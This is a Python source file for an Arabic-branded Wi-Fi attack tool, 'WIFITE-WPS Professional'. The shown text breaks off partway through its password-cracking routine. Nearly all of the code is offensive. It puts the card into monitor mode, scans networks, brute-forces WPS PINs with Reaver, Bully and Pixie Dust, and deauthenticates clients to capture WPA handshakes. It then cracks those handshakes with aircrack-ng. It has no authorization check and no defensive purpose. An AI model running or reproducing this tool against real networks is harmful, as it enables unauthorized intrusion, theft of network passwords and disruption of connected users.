#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
===============================================================
        ╔═══╗╔╗ ╔╗╔═══╗╔═══╗╔═══╗╔═══╗╔══╗ ╔═══╗╔═══╗
        ║╔═╗║║║ ║║║╔═╗║║╔══╝║╔═╗║║╔═╗║║╔╗║ ║╔═╗║║╔══╝
        ║╚═╝║║║ ║║║║ ║║║╚══╗║╚═╝║║║ ║║║╚╝╚╗║║ ║║║╚══╗
        ║╔╗╔╝║║ ║║║╚═╝║║╔══╝║╔╗╔╝║║ ║║║╔═╗║║║ ║║║╔══╝
        ║║║╚╗║╚═╝║║╔═╗║║╚══╗║║║╚╗║╚═╝║║╚═╝║║╚═╝║║╚══╗
        ╚╝╚═╝╚═══╝╚╝ ╚╝╚═══╝╚╝╚═╝╚═══╝╚═══╝╚═══╝╚═══╝
===============================================================
        WIFITE-WPS PROFESSIONAL - Version 6.0
        المطور: مرتضى | التواصل: @hd34
===============================================================
"""

import os
import sys
import time
import signal
import json
import re
import csv
import threading
import queue
import subprocess
import itertools
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Tuple
import tempfile
import shutil

# ===========================================
# CONFIGURATION
# ===========================================
class Config:
    """إعدادات النظام"""
    VERSION = "6.0.0"
    AUTHOR = "مرتضى"
    CONTACT = "@hd34"
    
    # الألوان
    COLORS = {
        'red': '\033[91m',
        'green': '\033[92m',
        'yellow': '\033[93m',
        'blue': '\033[94m',
        'magenta': '\033[95m',
        'cyan': '\033[96m',
        'white': '\033[97m',
        'bold': '\033[1m',
        'reset': '\033[0m'
    }
    
    # المسارات
    BASE_DIR = Path.home() / ".wifite_wps_pro"
    LOGS_DIR = BASE_DIR / "logs"
    CAPTURES_DIR = BASE_DIR / "captures"
    SESSIONS_DIR = BASE_DIR / "sessions"
    WORDLISTS_DIR = BASE_DIR / "wordlists"
    
    # إعدادات افتراضية
    SCAN_TIME = 20
    TIMEOUT = 300
    WPS_TIMEOUT = 120
    WPS_RETRIES = 10
    CHANNEL_HOP_DELAY = 5
    LOADING_TIME = 10  # وقت شريط التحميل

# ===========================================
# ANIMATION & LOADING BAR
# ===========================================
class Animator:
    """عرض الرسوم المتحركة وشريط التقدم"""
    
    @staticmethod
    def print_vader_banner():
        """طباعة بانر دارث فيدر"""
        vader_frames = [
            r"""
        _________________________________
       /::::::::::::::::;;::::::::::::::::\
      /:::::::::::'~||~~~``::::::::::::::\
     /::::::::'   .':     o`::::::::::::::\
    /:::::::' oo | |o  o    :::::::::::::::\
   /::::::: 8  .'.'    8 o  :::::::::::::::\
  /::::::: 8  | |     8    ::::::::::::::::\
 /::::::: _._| |_,...8    :::::::::::::::::\
|::::::'~--.   .--. `.   `:::::::::::::::::|
|:::::'     =8     ~  \ o :::::::::::::::::|
|::::'       8._ 88.   \ o::::::::::::::::|
|:::'   __. ,.ooo~~.    \ o`:::::::::::::::|
|:::   . -. 88`78o/:     \  `::::::::::::::|
|::'     /. o o \ ::      \88`:::::::::::::|   "He will join us or die."
|:;     o|| 8 8 |d.        `8 `:::::::::::|
|:.       - ^ ^ -'           `-`::::::::::|
|::.                          .:::::::::::|
|:::::.....           ::'     ``:::::::::|
|::::::::-'`-        88          `::::::::|
|:::::-'.          -       ::     ::::::::|
|:-~. . .                   :     ::::::::|
| .. .   ..:   o:8      88o       ::::::::|
|. .     :::   8:P     d888. . .  ::::::::|
|.   .   :88   88      888'  . .  ::::::::|
|   o8  d88P . 88   ' d88P   ..   ::::::::|
|  88P  888   d8P   ' 888         ::::::::|
|   8  d88P.'d:8  .- dP~ o8       ::::::::|   Darth Vader
|      888   888    d~ o888    LS ::::::::|
\_________________________________________/
            """,
            r"""
        _________________________________
       /::::::::::::::::;;::::::::::::::::\
      /:::::::::::'~||~~~``::::::::::::::\
     /::::::::'   .':     o`::::::::::::::\
    /:::::::' oo | |o  o    :::::::::::::::\
   /::::::: 8  .'.'    8 o  :::::::::::::::\
  /::::::: 8  | |     8    ::::::::::::::::\
 /::::::: _._| |_,...8    :::::::::::::::::\
|::::::'~--.   .--. `.   `:::::::::::::::::|
|:::::'     =8     ~  \ o :::::::::::::::::|
|::::'       8._ 88.   \ o::::::::::::::::|
|:::'   __. ,.ooo~~.    \ o`:::::::::::::::|
|:::   . -. 88`78o/:     \  `::::::::::::::|
|::'     /. o o \ ::      \88`:::::::::::::|   "I am your father."
|:;     o|| 8 8 |d.        `8 `:::::::::::|
|:.       - ^ ^ -'           `-`::::::::::|
|::.                          .:::::::::::|
|:::::.....           ::'     ``:::::::::|
|::::::::-'`-        88          `::::::::|
|:::::-'.          -       ::     ::::::::|
|:-~. . .                   :     ::::::::|
| .. .   ..:   o:8      88o       ::::::::|
|. .     :::   8:P     d888. . .  ::::::::|
|.   .   :88   88      888'  . .  ::::::::|
|   o8  d88P . 88   ' d88P   ..   ::::::::|
|  88P  888   d8P   ' 888         ::::::::|
|   8  d88P.'d:8  .- dP~ o8       ::::::::|   Darth Vader
|      888   888    d~ o888    LS ::::::::|
\_________________________________________/
            """
        ]
        
        colors = [
            "\033[38;2;0;255;255m",   # Cyan
            "\033[38;2;255;0;255m",   # Pink
            "\033[38;2;255;255;0m",   # Yellow
            "\033[38;2;0;255;128m",   # Green
        ]
        
        for color in colors:
            for frame in vader_frames:
                os.system('clear' if os.name == 'posix' else 'cls')
                print(color + frame + "\033[0m")
                print(f"\n{'='*60}")
                print(f"{' '*15}المطور: {Config.AUTHOR}")
                print(f"{' '*15}التواصل: {Config.CONTACT}")
                print(f"{' '*10}WIFITE-WPS Professional v{Config.VERSION}")
                print(f"{'='*60}\n")
                time.sleep(0.2)
    
    @staticmethod
    def loading_bar(seconds: int = 10, message: str = "جاري التحميل..."):
        """شريط تقدم زمني"""
        print(f"\n{message}")
        print("[" + " " * 50 + "]", end="")
        sys.stdout.flush()
        
        for i in range(51):
            time.sleep(seconds / 50)
            print(f"\r[", end="")
            print("█" * i + " " * (50 - i) + "]", end="")
            sys.stdout.flush()
        
        print()  # سطر جديد
    
    @staticmethod
    def countdown_timer(seconds: int = 10, message: str = "بدء العمل خلال:"):
        """عداد تنازلي"""
        print(f"\n{message}")
        for i in range(seconds, 0, -1):
            print(f"\r{' ' * 20}{i:2d} ثانية...", end="")
            sys.stdout.flush()
            time.sleep(1)
        print("\r{' ' * 20}بدء العمل الآن!      ")
    
    @staticmethod
    def progress_spinner(message: str = "جاري المعالجة"):
        """عجلة تقدم"""
        spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        
        print(f"\n{message} ", end="")
        for _ in range(20):
            print(f"\r{message} {next(spinner)}", end="")
            sys.stdout.flush()
            time.sleep(0.1)
        print(f"\r{message} ✓")

# ===========================================
# CORE FUNCTIONS
# ===========================================
def print_banner():
    """طباعة البانر"""
    Animator.print_vader_banner()

def printc(text: str, color: str = 'white', bold: bool = False) -> None:
    """طباعة نص ملون"""
    color_code = Config.COLORS.get(color, Config.COLORS['white'])
    bold_code = Config.COLORS['bold'] if bold else ''
    print(f"{bold_code}{color_code}{text}{Config.COLORS['reset']}")

def print_status(msg: str) -> None:
    """طباعة رسالة حالة"""
    printc(f"[✓] {msg}", "green", True)

def print_error(msg: str) -> None:
    """طباعة رسالة خطأ"""
    printc(f"[✗] {msg}", "red", True)

def print_warning(msg: str) -> None:
    """طباعة رسالة تحذير"""
    printc(f"[!] {msg}", "yellow", True)

def print_info(msg: str) -> None:
    """طباعة رسالة معلومات"""
    printc(f"[*] {msg}", "cyan")

def clear_screen() -> None:
    """مسح الشاشة"""
    os.system('clear' if os.name == 'posix' else 'cls')

def check_root() -> bool:
    """فحص صلاحيات الجذر"""
    if os.geteuid() != 0:
        print_error("يجب تشغيل الأداة بصلاحيات الجذر (sudo)")
        return False
    return True

def setup_directories() -> None:
    """إعداد المجلدات"""
    for directory in [Config.LOGS_DIR, Config.CAPTURES_DIR, 
                      Config.SESSIONS_DIR, Config.WORDLISTS_DIR]:
        directory.mkdir(parents=True, exist_ok=True)
    
    # إنشاء wordlist افتراضية إذا لم تكن موجودة
    default_wordlist = Config.WORDLISTS_DIR / "default.txt"
    if not default_wordlist.exists():
        common_passwords = [
            "12345678", "123456789", "password", "admin",
            "1234567890", "1234567", "123123", "00000000",
            "12341234", "11111111", "01234567", "12344321"
        ]
        with open(default_wordlist, 'w') as f:
            for pwd in common_passwords:
                f.write(f"{pwd}\n")

# ===========================================
# WIRELESS INTERFACE MANAGEMENT
# ===========================================
class WirelessInterface:
    """إدارة واجهات الشبكة اللاسلكية"""
    
    def __init__(self, interface: Optional[str] = None):
        self.interface = interface
        self.monitor_interface = None
        self.original_mode = None
        self.original_channel = None
    
    def get_available_interfaces(self) -> List[str]:
        """الحصول على الواجهات المتاحة"""
        interfaces = []
        
        # استخدام iwconfig
        try:
            result = subprocess.run(['iwconfig'], 
                                  capture_output=True, text=True, 
                                  timeout=5)
            lines = result.stdout.split('\n')
            current_iface = None
            
            for line in lines:
                if len(line) > 0 and not line.startswith(' '):
                    current_iface = line.split()[0]
                    if current_iface != 'lo':
                        interfaces.append(current_iface)
        
        except Exception as e:
            print_error(f"خطأ في الحصول على الواجهات: {e}")
        
        return interfaces
    
    def check_interface_support(self, interface: str) -> bool:
        """فحص دعم الواجهة لـ monitor mode"""
        try:
            Animator.loading_bar(5, "فحص دعم الواجهة لـ Monitor Mode...")
            
            # فحص دعم monitor mode
            result = subprocess.run(['iw', interface, 'info'],
                                  capture_output=True, text=True,
                                  timeout=5)
            
            if 'monitor' in result.stdout:
                return True
            
            # فحص باستخدام iw list
            result = subprocess.run(['iw', 'list'],
                                  capture_output=True, text=True,
                                  timeout=10)
            
            if 'monitor' in result.stdout:
                return True
            
            return False
            
        except Exception as e:
            print_error(f"خطأ في فحص الواجهة: {e}")
            return False
    
    def enable_monitor_mode(self, interface: str) -> Optional[str]:
        """تفعيل وضع المراقبة"""
        try:
            Animator.countdown_timer(10, "تفعيل وضع المراقبة خلال:")
            
            # إيقاف العمليات المعيقة
            self.kill_interfering_processes()
            
            # إيقاف الواجهة
            subprocess.run(['ip', 'link', 'set', interface, 'down'],
                          capture_output=True, timeout=10)
            
            # تغيير الوضع لـ monitor
            subprocess.run(['iw', interface, 'set', 'type', 'monitor'],
                          capture_output=True, timeout=10)
            
            # تشغيل الواجهة
            subprocess.run(['ip', 'link', 'set', interface, 'up'],
                          capture_output=True, timeout=10)
            
            # التحقق من الوضع
            result = subprocess.run(['iw', interface, 'info'],
                                  capture_output=True, text=True,
                                  timeout=5)
            
            if 'type monitor' in result.stdout:
                self.monitor_interface = interface
                print_status(f"تم تفعيل وضع المراقبة على {interface}")
                return interface
            else:
                print_error(f"فشل في تفعيل وضع المراقبة على {interface}")
                return None
                
        except Exception as e:
            print_error(f"خطأ في تفعيل وضع المراقبة: {e}")
            return None
    
    def disable_monitor_mode(self) -> bool:
        """تعطيل وضع المراقبة"""
        if not self.monitor_interface:
            return True
        
        try:
            Animator.loading_bar(5, "تعطيل وضع المراقبة...")
            
            # العودة للوضع managed
            subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'down'],
                          capture_output=True, timeout=10)
            
            subprocess.run(['iw', self.monitor_interface, 'set', 'type', 'managed'],
                          capture_output=True, timeout=10)
            
            subprocess.run(['ip', 'link', 'set', self.monitor_interface, 'up'],
                          capture_output=True, timeout=10)
            
            print_status(f"تم تعطيل وضع المراقبة على {self.monitor_interface}")
            self.monitor_interface = None
            return True
            
        except Exception as e:
            print_error(f"خطأ في تعطيل وضع المراقبة: {e}")
            return False
    
    def kill_interfering_processes(self) -> None:
        """قتل العمليات المعيقة"""
        try:
            Animator.progress_spinner("إيقاف العمليات المعيقة")
            
            subprocess.run(['airmon-ng', 'check', 'kill'],
                          capture_output=True, timeout=10)
        except Exception as e:
            print_warning(f"خطأ في قتل العمليات: {e}")
    
    def set_channel(self, interface: str, channel: int) -> bool:
        """تعيين قناة للواجهة"""
        try:
            Animator.countdown_timer(3, f"تعيين القناة {channel} خلال:")
            
            subprocess.run(['iw', 'dev', interface, 'set', 'channel', str(channel)],
                          capture_output=True, timeout=5)
            return True
        except Exception as e:
            print_error(f"خطأ في تعيين القناة: {e}")
            return False

# ===========================================
# NETWORK SCANNER
# ===========================================
class NetworkScanner:
    """مسح الشبكات اللاسلكية"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.networks: List[Dict] = []
        self.scan_file = Config.CAPTURES_DIR / f"scan_{int(time.time())}.csv"
        self.scan_process = None
    
    def scan(self, duration: int = Config.SCAN_TIME) -> bool:
        """مسح الشبكات"""
        try:
            Animator.countdown_timer(10, f"بدء المسح لمدة {duration} ثانية خلال:")
            
            # تشغيل airodump-ng
            cmd = [
                'airodump-ng',
                self.interface,
                '--write', str(self.scan_file.with_suffix('')),
                '--output-format', 'csv',
                '--write-interval', '5'
            ]
            
            print_info(f"جاري المسح لمدة {duration} ثانية...")
            print("[" + " " * 50 + "]", end="")
            sys.stdout.flush()
            
            self.scan_process = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # عرض شريط تقدم للمسح
            for i in range(duration):
                if self.scan_process.poll() is not None:
                    break
                time.sleep(1)
                progress = int((i + 1) * 50 / duration)
                print(f"\r[", end="")
                print("█" * progress + " " * (50 - progress) + "]", end="")
                sys.stdout.flush()
            
            print()  # سطر جديد
            
            # إنهاء العملية
            if self.scan_process and self.scan_process.poll() is None:
                self.scan_process.terminate()
                self.scan_process.wait(timeout=5)
            
            Animator.progress_spinner("تحليل نتائج المسح")
            
            # تحليل النتائج
            return self.parse_results()
            
        except Exception as e:
            print_error(f"خطأ في المسح: {e}")
            return False
    
    def parse_results(self) -> bool:
        """تحليل نتائج المسح"""
        try:
            csv_file = f"{self.scan_file.with_suffix('')}-01.csv"
            
            if not os.path.exists(csv_file):
                print_error(f"ملف النتائج غير موجود: {csv_file}")
                return False
            
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            self.networks = []
            in_network_section = False
            
            for line in lines:
                line = line.strip()
                
                if 'Station' in line:
                    break
                
                if 'BSSID' in line and 'Channel' in line:
                    in_network_section = True
                    continue
                
                if in_network_section and line:
                    parts = line.split(',')
                    
                    if len(parts) >= 14:
                        network = {
                            'bssid': parts[0].strip(),
                            'first_seen': parts[1].strip(),
                            'last_seen': parts[2].strip(),
                            'channel': parts[3].strip(),
                            'speed': parts[4].strip(),
                            'privacy': parts[5].strip(),
                            'cipher': parts[6].strip(),
                            'authentication': parts[7].strip(),
                            'power': parts[8].strip() if len(parts) > 8 else '',
                            'beacons': parts[9].strip() if len(parts) > 9 else '',
                            'iv': parts[10].strip() if len(parts) > 10 else '',
                            'lan_ip': parts[11].strip() if len(parts) > 11 else '',
                            'id_length': parts[12].strip() if len(parts) > 12 else '',
                            'essid': parts[13].strip() if len(parts) > 13 else '',
                            'key': parts[14].strip() if len(parts) > 14 else '',
                            'wps': self.check_wps(parts)
                        }
                        
                        if network['essid']:  # تجاهل الشبكات المخفية
                            self.networks.append(network)
            
            print_status(f"تم اكتشاف {len(self.networks)} شبكة")
            return True
            
        except Exception as e:
            print_error(f"خطأ في تحليل النتائج: {e}")
            return False
    
    def check_wps(self, parts: List[str]) -> bool:
        """فحص إذا كانت الشبكة تدعم WPS"""
        try:
            if len(parts) > 10:
                wps_info = parts[10].upper()
                return 'WPS' in wps_info
            return False
        except:
            return False
    
    def display_networks(self) -> None:
        """عرض الشبكات المكتشفة"""
        if not self.networks:
            print_error("لم يتم العثور على شبكات")
            return
        
        printc("\n" + "═" * 100, "cyan")
        printc(" " * 30 + "الشبكات المكتشفة", "bold")
        printc("═" * 100, "cyan")
        
        print(f"{'#':<3} {'BSSID':<18} {'CH':<4} {'PWR':<4} "
              f"{'WPS':<5} {'CIPHER':<10} {'ESSID':<20}")
        printc("─" * 100, "cyan")
        
        for i, net in enumerate(self.networks, 1):
            wps_icon = "✓" if net['wps'] else "✗"
            wps_color = "green" if net['wps'] else "red"
            
            cipher = net['cipher'][:8] if net['cipher'] else ""
            
            print(f"{i:<3} {net['bssid']:<18} {net['channel']:<4} "
                  f"{net['power']:<4} ", end='')
            printc(f"{wps_icon:<5}", wps_color, end='')
            print(f" {cipher:<10} {net['essid'][:20]:<20}")
        
        printc("═" * 100 + "\n", "cyan")
    
    def get_network_by_index(self, index: int) -> Optional[Dict]:
        """الحصول على شبكة حسب الرقم"""
        if 1 <= index <= len(self.networks):
            return self.networks[index - 1]
        return None

# ===========================================
# WPS ATTACKER
# ===========================================
class WPSAttacker:
    """مهاجمة WPS"""
    
    def __init__(self, interface: str, target: Dict):
        self.interface = interface
        self.target = target
        self.session_file = Config.SESSIONS_DIR / f"{target['bssid'].replace(':', '')}.session"
        self.is_running = False
        self.current_process = None
    
    def check_wps_locked(self) -> bool:
        """فحص إذا كان WPS مقفلاً"""
        try:
            Animator.countdown_timer(10, "فحص حالة WPS خلال:")
            
            # استخدام wash للكشف عن حالة WPS
            temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False)
            temp_path = temp_file.name
            temp_file.close()
            
            cmd = [
                'timeout', '30',
                'wash', '-i', self.interface,
                '--scan', '--ignore-fcs',
                '-o', temp_path
            ]
            
            Animator.loading_bar(30, "جاري فحص WPS...")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=35)
            
            if os.path.exists(temp_path):
                with open(temp_path, 'r') as f:
                    lines = f.readlines()
                
                for line in lines[1:]:  # تخطي العنوان
                    parts = line.split()
                    if len(parts) >= 7 and self.target['bssid'].replace(':', '').lower() in parts[0].lower():
                        lock_status = parts[5]
                        if 'Yes' in lock_status:
                            print_warning(f"WPS مقفل على {self.target['essid']}")
                            return True
                
                os.unlink(temp_path)
            
            return False
            
        except Exception as e:
            print_warning(f"خطأ في فحص قفل WPS: {e}")
            return False
    
    def attack_with_reaver(self) -> Dict:
        """هجوم باستخدام Reaver"""
        results = {
            'success': False,
            'pin': None,
            'password': None,
            'time_taken': 0,
            'attempts': 0
        }
        
        start_time = time.time()
        
        try:
            Animator.countdown_timer(10, "بدء هجوم Reaver خلال:")
            
            # بناء أمر Reaver
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', self.target['bssid'],
                '-c', self.target['channel'],
                '-vv',
                '-K', '1',  # Pixie Dust
                '-N',  # عدم إرسال NACK
                '-d', '2',  # تأخير 2 ثانية
                '-T', '1',  # مهلة 1 ثانية
                '-r', '3:1',  # 3 محاولات لكل PIN
                '--session', str(self.session_file)
            ]
            
            print_info(f"بدء هجوم Reaver على {self.target['essid']}")
            print_info(f"BSSID: {self.target['bssid']}")
            print_info(f"Channel: {self.target['channel']}")
            
            self.is_running = True
            self.current_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            pin_pattern = re.compile(r'WPS\s+PIN:\s*\'([0-9]{8})\'')
            pass_pattern = re.compile(r'WPA\s+PSK:\s*\'(.+?)\'')
            attempt_pattern = re.compile(r'([0-9]+)\s*trying\s*pin')
            
            print("\nجاري الهجوم...")
            print("[" + " " * 50 + "]", end="")
            sys.stdout.flush()
            
            progress_interval = Config.WPS_TIMEOUT / 50
            progress_count = 0
            
            while self.is_running:
                if self.current_process.poll() is not None:
                    break
                
                line = self.current_process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    progress_count += 1
                    
                    # تحديث شريط التقدم كل فترة
                    if progress_count % 10 == 0:
                        progress = min(50, int((time.time() - start_time) / progress_interval))
                        print(f"\r[", end="")
                        print("█" * progress + " " * (50 - progress) + "]", end="")
                        sys.stdout.flush()
                    
                    continue
                
                # البحث عن PIN
                pin_match = pin_pattern.search(line)
                if pin_match:
                    results['pin'] = pin_match.group(1)
                    print_status(f"تم العثور على PIN: {results['pin']}")
                
                # البحث عن كلمة السر
                pass_match = pass_pattern.search(line)
                if pass_match:
                    results['password'] = pass_match.group(1)
                    print_status(f"تم العثور على كلمة السر: {results['password']}")
                    results['success'] = True
                    break
                
                # عد المحاولات
                attempt_match = attempt_pattern.search(line)
                if attempt_match:
                    results['attempts'] = int(attempt_match.group(1))
            
            print()  # سطر جديد
            
            if self.current_process and self.current_process.poll() is None:
                self.current_process.terminate()
                self.current_process.wait()
            
            results['time_taken'] = time.time() - start_time
            
            if results['success']:
                print_status("الهجوم نجح!")
            else:
                print_warning("الهجوم فشل")
            
            return results
            
        except KeyboardInterrupt:
            print_warning("تم إيقاف الهجوم")
            if self.current_process:
                self.current_process.terminate()
            return results
            
        except Exception as e:
            print_error(f"خطأ في هجوم Reaver: {e}")
            return results
    
    def attack_with_bully(self) -> Dict:
        """هجوم باستخدام Bully"""
        results = {
            'success': False,
            'pin': None,
            'password': None,
            'time_taken': 0
        }
        
        start_time = time.time()
        
        try:
            Animator.countdown_timer(10, "بدء هجوم Bully خلال:")
            
            cmd = [
                'bully',
                '-b', self.target['bssid'],
                '-c', self.target['channel'],
                '-v', '3',
                '-p', 'RX',  # Pixie Dust
                '--bruteforce',
                self.interface
            ]
            
            print_info(f"بدء هجوم Bully على {self.target['essid']}")
            
            self.is_running = True
            self.current_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            pin_pattern = re.compile(r'pin\s*=\s*([0-9]{8})', re.IGNORECASE)
            pass_pattern = re.compile(r'key\s*=\s*["\'](.+?)["\']', re.IGNORECASE)
            
            print("\nجاري الهجوم...")
            print("[" + " " * 50 + "]", end="")
            sys.stdout.flush()
            
            progress_interval = Config.WPS_TIMEOUT / 50
            progress_count = 0
            
            while self.is_running:
                if self.current_process.poll() is not None:
                    break
                
                line = self.current_process.stdout.readline()
                if not line:
                    time.sleep(0.1)
                    progress_count += 1
                    
                    # تحديث شريط التقدم
                    if progress_count % 10 == 0:
                        progress = min(50, int((time.time() - start_time) / progress_interval))
                        print(f"\r[", end="")
                        print("█" * progress + " " * (50 - progress) + "]", end="")
                        sys.stdout.flush()
                    
                    continue
                
                pin_match = pin_pattern.search(line)
                if pin_match:
                    results['pin'] = pin_match.group(1)
                    print_status(f"تم العثور على PIN: {results['pin']}")
                
                pass_match = pass_pattern.search(line)
                if pass_match:
                    results['password'] = pass_match.group(1)
                    print_status(f"تم العثور على كلمة السر: {results['password']}")
                    results['success'] = True
                    break
            
            print()  # سطر جديد
            
            if self.current_process and self.current_process.poll() is None:
                self.current_process.terminate()
                self.current_process.wait()
            
            results['time_taken'] = time.time() - start_time
            
            if results['success']:
                print_status("الهجوم نجح!")
            else:
                print_warning("الهجوم فشل")
            
            return results
            
        except KeyboardInterrupt:
            print_warning("تم إيقاف الهجوم")
            if self.current_process:
                self.current_process.terminate()
            return results
            
        except Exception as e:
            print_error(f"خطأ في هجوم Bully: {e}")
            return results
    
    def pixie_dust_attack(self) -> Dict:
        """هجوم Pixie Dust المخصص"""
        results = {
            'success': False,
            'pin': None,
            'password': None,
            'time_taken': 0
        }
        
        try:
            Animator.countdown_timer(10, "بدء هجوم Pixie Dust خلال:")
            
            # استخدام pixiewps إذا كان مثبتاً
            result = subprocess.run(['which', 'pixiewps'], 
                                  capture_output=True, text=True)
            
            if result.returncode != 0:
                print_warning("pixiewps غير مثبت. جاري استخدام Reaver مع Pixie Dust...")
                return self.attack_with_reaver()
            
            print_info("بدء هجوم Pixie Dust المباشر")
            
            Animator.loading_bar(30, "جاري جمع بيانات WPS...")
            
            # الحصول على بيانات WPS
            cmd = [
                'reaver',
                '-i', self.interface,
                '-b', self.target['bssid'],
                '-c', self.target['channel'],
                '-K', '1',
                '-f'
            ]
            
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            # البحث عن بيانات Pixie Dust
            pke_pattern = re.compile(r'PKE:\s*([0-9a-f]+)', re.IGNORECASE)
            pkr_pattern = re.compile(r'PKR:\s*([0-9a-f]+)', re.IGNORECASE)
            e_hash1_pattern = re.compile(r'E-Hash1:\s*([0-9a-f]+)', re.IGNORECASE)
            e_hash2_pattern = re.compile(r'E-Hash2:\s*([0-9a-f]+)', re.IGNORECASE)
            authkey_pattern = re.compile(r'AuthKey:\s*([0-9a-f]+)', re.IGNORECASE)
            e_nonce_pattern = re.compile(r'E-Nonce:\s*([0-9a-f]+)', re.IGNORECASE)
            
            pke = pke_pattern.search(process.stdout)
            pkr = pkr_pattern.search(process.stdout)
            e_hash1 = e_hash1_pattern.search(process.stdout)
            e_hash2 = e_hash2_pattern.search(process.stdout)
            authkey = authkey_pattern.search(process.stdout)
            e_nonce = e_nonce_pattern.search(process.stdout)
            
            if all([pke, pkr, e_hash1, e_hash2, authkey, e_nonce]):
                Animator.progress_spinner("جاري تحليل بيانات Pixie Dust")
                
                # تشغيل pixiewps
                pixie_cmd = [
                    'pixiewps',
                    '-e', pke.group(1),
                    '-r', pkr.group(1),
                    '-s', e_hash1.group(1),
                    '-z', e_hash2.group(1),
                    '-a', authkey.group(1),
                    '-n', e_nonce.group(1)
                ]
                
                pixie_result = subprocess.run(pixie_cmd, capture_output=True, text=True)
                
                pin_pattern = re.compile(r'WPS\s+pin:\s*([0-9]{8})', re.IGNORECASE)
                pin_match = pin_pattern.search(pixie_result.stdout)
                
                if pin_match:
                    results['pin'] = pin_match.group(1)
                    print_status(f"Pixie Dust نجح! PIN: {results['pin']}")
                    
                    Animator.loading_bar(20, "جاري التحقق من كلمة السر...")
                    
                    # محاولة الحصول على كلمة السر باستخدام PIN
                    verify_cmd = [
                        'reaver',
                        '-i', self.interface,
                        '-b', self.target['bssid'],
                        '-p', results['pin'],
                        '-c', self.target['channel'],
                        '-f'
                    ]
                    
                    verify_result = subprocess.run(verify_cmd, capture_output=True, text=True, timeout=30)
                    
                    pass_pattern = re.compile(r'WPA\s+PSK:\s*["\'](.+?)["\']', re.IGNORECASE)
                    pass_match = pass_pattern.search(verify_result.stdout)
                    
                    if pass_match:
                        results['password'] = pass_match.group(1)
                        results['success'] = True
                        print_status(f"تم الحصول على كلمة السر: {results['password']}")
            
            return results
            
        except Exception as e:
            print_error(f"خطأ في هجوم Pixie Dust: {e}")
            return results
    
    def stop(self) -> None:
        """إيقاف الهجوم"""
        self.is_running = False
        if self.current_process:
            self.current_process.terminate()

# ===========================================
# WPA/WPA2 ATTACKER
# ===========================================
class WPAAttacker:
    """مهاجمة WPA/WPA2"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.capture_file = None
        self.deauth_process = None
    
    def capture_handshake(self, target: Dict, timeout: int = 120) -> bool:
        """التقاط هاندشيك WPA"""
        try:
            Animator.countdown_timer(10, "بدء التقاط هاندشيك خلال:")
            
            # اسم ملف الالتقاط
            timestamp = int(time.time())
            essid_clean = re.sub(r'[^a-zA-Z0-9]', '_', target['essid'])
            self.capture_file = Config.CAPTURES_DIR / f"wpa_{essid_clean}_{timestamp}"
            
            print_info(f"جاري التقاط هاندشيك لـ {target['essid']}")
            print_info(f"القناة: {target['channel']}")
            
            # تشغيل airodump للالتقاط
            airodump_cmd = [
                'airodump-ng',
                '--bssid', target['bssid'],
                '-c', target['channel'],
                '-w', str(self.capture_file),
                '--output-format', 'pcap',
                self.interface
            ]
            
            airodump_proc = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # انتظار لتثبيت الالتقاط
            time.sleep(5)
            
            # إرسال حزم deauth لفصل العميل
            print_info("جاري إرسال حزم deauth...")
            
            Animator.loading_bar(10, "إرسال حزم deauth...")
            
            deauth_cmd = [
                'aireplay-ng',
                '--deauth', '10',
                '-a', target['bssid'],
                self.interface
            ]
            
            subprocess.run(deauth_cmd, capture_output=True, timeout=15)
            
            # الانتظار لالتقاط الهاندشيك
            print_info("جاري انتظار الهاندشيك...")
            print("[" + " " * 50 + "]", end="")
            sys.stdout.flush()
            
            for i in range(timeout // 5):
                # التحقق إذا تم التقاط الهاندشيك
                check_cmd = [
                    'aircrack-ng',
                    str(self.capture_file) + '-01.cap',
                    '-J', str(self.capture_file)
                ]
                
                result = subprocess.run(check_cmd, capture_output=True, text=True)
                
                if 'handshake' in result.stdout.lower():
                    airodump_proc.terminate()
                    print_status("تم التقاط الهاندشيك بنجاح!")
                    return True
                
                time.sleep(5)
                progress = int((i + 1) * 50 / (timeout // 5))
                print(f"\r[", end="")
                print("█" * progress + " " * (50 - progress) + "]", end="")
                sys.stdout.flush()
            
            print()  # سطر جديد
            airodump_proc.terminate()
            print_warning("فشل في التقاط الهاندشيك")
            return False
            
        except Exception as e:
            print_error(f"خطأ في التقاط الهاندشيك: {e}")
            return False
    
    def crack_password(self, wordlist_path: str) -> Optional[str]:
        """كسر كلمة السر باستخدام الهاندشيك"""
        if not self.capture_file:
            print_error("لم يتم التقاط هاندشيك بعد")
            return None
        
        try:
            Animator.countdown_timer(10, "بدء كسر كلمة السر خلال:")
            
            cap_file = str(self.capture_file) + '-01.cap'
            
            if not os.path.exists(cap_file):
                print_error(f"ملف الالتقاط غير موجود: {cap_file}")
                return None
            
            print_info(f"جاري كسر كلمة السر باستخدام {wordlist_path}")
            
            cmd = [
                'aircrack-ng',
                cap_file,
                '-w', wordlist_path
            ]
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            password_pattern = re.compile(r'KEY\s+FOUND!\s*\[(.+?)\]', re.IGNORECASE)
            password = None
            
            print("\nجاري كسر كلمة السر...")
            print("[" + " " * 50 + "]", end="")
            sys.stdout.flush()
            
            start_time = time.time()
            progress_count = 0
            
            while True:
                line = process.stdout.readline()
                if not line:
